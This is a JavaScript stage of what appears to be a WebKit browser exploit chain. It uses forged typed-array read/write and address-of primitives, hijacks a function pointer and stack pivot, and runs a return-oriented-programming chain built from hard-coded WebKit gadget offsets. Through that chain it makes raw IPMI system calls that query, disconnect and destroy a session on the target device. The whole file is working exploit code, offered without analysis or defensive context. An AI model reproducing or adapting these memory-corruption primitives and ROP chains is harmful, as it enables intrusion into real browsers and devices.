// Query and clean up the live named IPMI client left connected by the raw
// connect probe. Uses raw ipmimgr_call op 0x469 (session PID), 0x310
// (disconnect), and 3 (destroy). No client is created here.
var result;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0]!==state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  var base=state.calibratedViewBase;
  if (carrier.length!==65536 || carrier[0]!==0x31 ||
      carrier[7]!==0xa8 || base%4096!==0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var n=0;n<count;n++) out.push(forged[index+n]);
    return out;
  }
  function valueOf(bytes) {
    var value=0;
    for (var n=bytes.length-1;n>=0;n--)
      value=value*256+bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value<0 ||
        value>=0x1000000000000)
      throw new Error("pointer_invalid");
    var out=[];
    for (var n=0;n<8;n++)
      out.push(Math.floor(value/Math.pow(2,n*8))&255);
    return out;
  }
  function same(left,right) {
    if (!left || !right || left.length!==right.length) return false;
    for (var n=0;n<left.length;n++)
      if (left[n]!==right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0]=object;
      return valueOf(bytesAt(state.index,8));
    } finally {
      state.array[0]=state.a;
    }
  }
  var carrierIndex=addressOf(carrier)-base;
  var carrierSlot=carrierIndex+8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot<0 ||
      carrierSlot+8>=16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal=bytesAt(carrierSlot,8);
  function readAt(address,count) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || count<1 || count>192)
      throw new Error("native_read_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      var out=[];
      for (var r=0;r<count;r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  function writeAt(address,bytes) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || address%8!==0 ||
        !bytes || bytes.length!==8)
      throw new Error("native_write_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      for (var w=0;w<8;w++) carrier[w]=bytes[w];
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  var ipmi=0x833f00000;
  var targets={
    ipmi_raw_call:[0x80247f300,
      [0x48,0xc7,0xc0,0x6e,0x02,0x00,0x00,0x49,
       0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48]]
  };
  if (!same(readAt(ipmi,8),[0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56]))
    throw new Error("ipmi_image_prefix_changed");
  for (var tname in targets)
    if (!same(readAt(targets[tname][0],16),targets[tname][1]))
      throw new Error("ipmi_signature_changed_"+tname);
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      !same(readAt(plan.addresses.stack+plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset=0x2f80;
  var chainSize=19*8;
  if (scratchOffset<plan.stackOffset+64 ||
      scratchOffset+chainSize>=plan.stack.length ||
      plan.frame.length<0x2000)
    throw new Error("scratch_region_invalid");
  var caller=function (name,args) {
    if (!Object.prototype.hasOwnProperty.call(targets,name))
      throw new Error("target_not_allowed");
    if (!Array.isArray(args) || args.length>6)
      throw new Error("args_invalid");
    var values=[];
    for (var ai=0;ai<6;ai++) {
      var value=ai<args.length?args[ai]:0;
      if (!Number.isSafeInteger(value) || value<0 ||
          value>=0x1000000000000)
        throw new Error("arg_invalid_"+ai);
      values.push(value);
    }
    var target=targets[name][0];
    if (!same(readAt(target,16),targets[name][1]) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack+plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal=readAt(plan.functionSlot,8);
    var pivotOriginal=readAt(plan.pivotCell,8);
    var pivotStackOriginal=readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal=Array.from(plan.frame.subarray(0,8));
    var chainOriginal=Array.from(plan.stack.subarray(
      scratchOffset,scratchOffset+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7]>2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset+c*8,0x0a,true);
          stackView.setUint32(scratchOffset+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackView.setUint32(scratchOffset+11*8,0xcafebeaf,true);
      stackView.setUint32(scratchOffset+11*8+4,0xdeadbade,true);
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset,chainSize),
                Array.from(plan.stack.subarray(scratchOffset,
                                              scratchOffset+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(plan.webkitBase+0x295f948));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),
                pointerBytes(plan.webkitBase+0x295f948)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true) };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  var paramsOffset=0x790, resultOffset=0x788;
  var pidOffset=0x780, statusOffset=0x784;
  var paramsAddress=plan.addresses.frame+paramsOffset;
  var resultAddress=plan.addresses.frame+resultOffset;
  var pidAddress=plan.addresses.frame+pidOffset;
  var statusAddress=plan.addresses.frame+statusOffset;
  var kid=58928;
  var scratchOriginal=Array.from(plan.frame.subarray(
    0x700,0x800));
  var before=native.call("getpid",[]);
  if (before.value!==145 || before.high!==0)
    throw new Error("session_pid_changed");
  function raw(op,arg2,paramsPtr,paramsSize) {
    var dv=new DataView(plan.frame.buffer);
    dv.setUint32(resultOffset,0,true);
    dv.setUint32(resultOffset+4,0,true);
    var call=caller("ipmi_raw_call",
      [op,arg2,resultAddress,paramsPtr,paramsSize,0]);
    return {value:call.value,high:call.high,
      errno:call.value===-1?native.readErrno():0,
      result:dv.getUint32(resultOffset,true)};
  }
  function putPtr(offset,value) {
    var dv=new DataView(plan.frame.buffer);
    dv.setUint32(offset,value>>>0,true);
    dv.setUint32(offset+4,Math.floor(value/0x100000000)>>>0,true);
  }
  var query=null,disconnect=null,destroy=null;
  var sessionPid=0,disconnectStatus=0;
  try {
    phase="session_query";
    if (api && typeof api.markSync==="function")
      api.markSync("ipmi_cleanup_preflight");
    plan.frame.fill(0,0x700,0x800);
    putPtr(pidOffset,0);
    putPtr(paramsOffset,pidAddress);
    query=raw(0x469,kid,paramsAddress,8);
    sessionPid=new DataView(plan.frame.buffer).getUint32(pidOffset,true);
    if (api && typeof api.markSync==="function")
      api.markSync("ipmi_cleanup_session");
    plan.frame.fill(0,0x700,0x800);
    putPtr(statusOffset,0);
    putPtr(paramsOffset,statusAddress);
    disconnect=raw(0x310,kid,paramsAddress,8);
    disconnectStatus=new DataView(plan.frame.buffer)
      .getUint32(statusOffset,true);
    if (api && typeof api.markSync==="function")
      api.markSync("ipmi_cleanup_disconnect");
    destroy=raw(3,kid,0,0);
    if (api && typeof api.markSync==="function")
      api.markSync("ipmi_cleanup_destroy");
  } finally {
    for (var fi=0;fi<scratchOriginal.length;fi++)
      plan.frame[0x700+fi]=scratchOriginal[fi];
  }
  var after=native.call("getpid",[]);
  var scratchRestored=scratchOriginal.every(function (byte,index) {
    return plan.frame[0x700+index]===byte;
  });
  var callerRestored=same(bytesAt(carrierSlot,8),carrierOriginal) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (api && typeof api.markSync==="function")
    api.markSync("ipmi_cleanup_restored");
  result={id:"ipmi_session_cleanup_v1",
    status:(after.value===before.value && after.high===0 &&
      scratchRestored && callerRestored)?"pass":"fail",
    details:{client_kid:kid,
      query:(query?(query.value>>>0).toString(16):"null")+"/"+
        (query?query.errno:0)+"/"+sessionPid,
      disconnect:(disconnect?(disconnect.value>>>0).toString(16):"null")+
        "/"+(disconnect?disconnect.errno:0)+"/"+disconnectStatus,
      destroy:(destroy?(destroy.value>>>0).toString(16):"null")+
        "/"+(destroy?destroy.errno:0),
      pid_ok:after.value===before.value&&after.high===0,
      caller_restored:callerRestored,
      scratch_restored:scratchRestored}};
} catch (error) {
  result={id:"ipmi_session_cleanup_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
